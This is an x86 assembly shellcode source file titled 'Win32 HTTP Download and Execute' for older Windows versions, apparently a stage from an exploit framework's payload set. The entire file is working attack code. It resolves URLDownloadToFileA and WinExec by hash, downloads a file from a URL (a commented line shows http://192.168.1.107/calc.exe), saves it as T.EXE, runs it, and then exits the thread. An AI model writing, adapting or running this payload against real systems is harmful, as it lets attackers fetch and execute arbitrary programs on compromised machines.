;      Title:  Win32 HTTP Download and Execute
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  dick


[BITS 32]

%include "win32_stage_api.asm"

push ebx

call LLoadUrlmon

pop ebx

LWinExec:
    push byte 0
    call LGetEIP
    lea eax, [eax + 33]
    push eax
    push ebx
    push 0x0E8AFE98
    call esi
    call eax

LQuit:
    push ebx         ; kernel32.dll
    push 0x60E0CEEF  ; ExitThread
    call esi
    
    push byte 0
    call eax

db "urlmon", 0x00
db "T.EXE", 0x00

LLoadUrlmon:
    pop ebx             ; save address to data in ebx
    push ebx
    lea ecx, [ebx + 34]
    push ecx            ; push address of "urlmon.DLL"
    call edi            ; call LoadLibraryA("urlmon.DLL")  

LURLDownloadToFileA:
    push eax                    ; dll handle
    push 0x702F1A36             ; "URLDownloadToFileA" hash
    call esi                    ; call GetProcAddressA("URLDownloadToCacheFileA")
    mov edx, eax                ; store "URLDownloadToFileA" in edx
    push byte 0
    push byte 0
    lea ecx, [ebx + 41]
    push ecx                    ; push address of "T.EXE"
    call LGetEIP
    lea ecx, [eax + 12]
    push ecx                    ; push address of url
    push byte 0
    call edx                    ; call "URLDownloadToFileA"
    ret

LGetEIP:
    pop eax
    push eax
    ret

;db "http://192.168.1.107/calc.exe", 0x00